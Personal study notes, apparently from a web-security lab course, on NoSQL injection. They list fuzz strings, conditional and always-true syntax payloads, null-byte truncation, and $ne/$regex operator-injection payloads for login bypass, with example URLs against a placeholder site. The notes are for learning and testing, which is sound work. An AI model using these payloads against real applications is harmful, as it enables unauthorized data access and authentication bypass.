# NOSQLi

# TYPES:
### Syntax Injection
### OPerator INjection


## NOSQL SYNTAX NJECTION
'"`{
;$Foo}
$Foo \xYZ  -------> if request is from URL 

for JSON --> '\"`{\r;$Foo}\n$Foo \\xYZ\u0000

the above strings can be used to test fot noslqi if detectable changes or eroor is caused

now that we have found the presence of Nosqli we test 
whci characters are processed we can try to inject all specula charcter like ' " etc to break nosqli syntax
STEp2 -->confirm conditional behavior
' && 0 && 'x and ' && 1 && 'x as    -----> we can use the followinf like methods to detect conditional behaviour
usage --> https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x

step3 try to override the suntac like we do in sqli which alway evaluated to be ture and gives us all the data
we can use 
'||1||'
or 
this.category == 'fizzy'||'1'=='1'


NB--->SUPPOSE SOMETIME WE WANT TO BREAK OUT OF SYNTX OR COMMENT THE REST OF THE PARTS THEM WE MAY USE NULL BYTES AFTER ' THAT WILL INGNORE THE REST OF THE PART
LIKE %00 CAN BE USED ----> https://insecure-website.com/product/lookup?category=fizzy'%00

### NOSQL OPERATOR INJECTION
we can make use of followinf operators:

    $where - Matches documents that satisfy a JavaScript expression.
    $ne - Matches all values that are not equal to a specified value.
    $in - Matches all of the values specified in an array.
    $regex - Selects documents where values match a specified regular expression.
FOR JSON -------> {"username":{"$ne":"invalid"}}
FOR URL ---------> username[$ne]=invalid
if it dont woks change method to POST and content type to json
try not to use $ne injection alway if you know thd username use it or else if you know part of usernmae then used regex


